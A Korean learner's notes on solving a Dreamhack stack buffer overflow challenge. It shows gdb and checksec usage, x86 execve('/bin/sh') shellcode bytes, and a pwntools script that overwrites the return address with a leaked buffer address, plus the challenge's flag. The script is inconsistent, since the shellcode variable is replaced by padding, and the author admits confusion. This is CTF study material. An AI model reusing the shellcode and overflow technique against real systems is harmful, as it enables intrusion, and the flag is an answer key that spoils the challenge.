칼리리눅스로 파일을 다운로드한다.

nc 로 들어가니 buf = (0xffd14be8) 라는 것만 나오고 입력할수 있는 것 밖에 없다.
파일을 다운로드해서 zip다 음 unzip이었나?

$ unzip 파일명 
을 하니 파일압축해제가 되고 
음 코드를 봐도 하나도 모르겠어 ㅠㅠ

$ checksec basic_exploitation_000   #파일의 보호기법을 파악


$ gdb basic_exploitation_000
$ r $(python3 -c 'print("\xff"*100)')   #\xff를 100번 입력하는 것
음 브레이크포인트 해제어케하더라?
$ info breakpoint   #브레이크를 걸었던 곳 파악
$ del [브레이크번호] # 브레이크포인트 해제
 
일단 buf + sfp(4바이트) + ret (4바이트) 가 고정인것같다. 
buf현재 128바이트이고 sfp 4바이트를 덮어씌우면 ret 주소를 원하는 것으로 이동가능
그럼 어디로 ret 해야하느냐?

쉘코드 : /bin/sh 을 16진수코드로 
"\x31\xc0\x31\xd2\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89"
"\xe3\x52\x53\x89\xe1\xb0\x0b\xcd\x80" 

31 c0 31 d2 50 68 2f 2f 73 68 68 2f 62 69 6e  89 e3 52 53 89 e1 b0 0b cd 80   25바이트?

pwntools 사용법 
https://blog.naver.com/eunso02/222630005600

근데 왜 작동을 안하는걸까?

_________
from pwn import *
context.log_level = 'debug'

p = remote('host3.dreamhack.games', '포트번호')

p.recvuntil("buf = (")
buf = int(p.recv(10), 16)
shellcode = b"\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\x31\xd2\xb0\x08\x40\x40\x40\xcd\x80"
shellcode = b'A' * 0x6c
shellcode += p32(buf)

p.sendline(shellcode)
p.interactive()
_________
이걸로 하니깐 작동이 돼는데 으흠 
근데 도대체 왜 쉘이 b~ 로 설정이 돼는건데 ㅠㅠ

모르겠다..


답 DH{465dd453b2a25a26a847a93d3695676d}
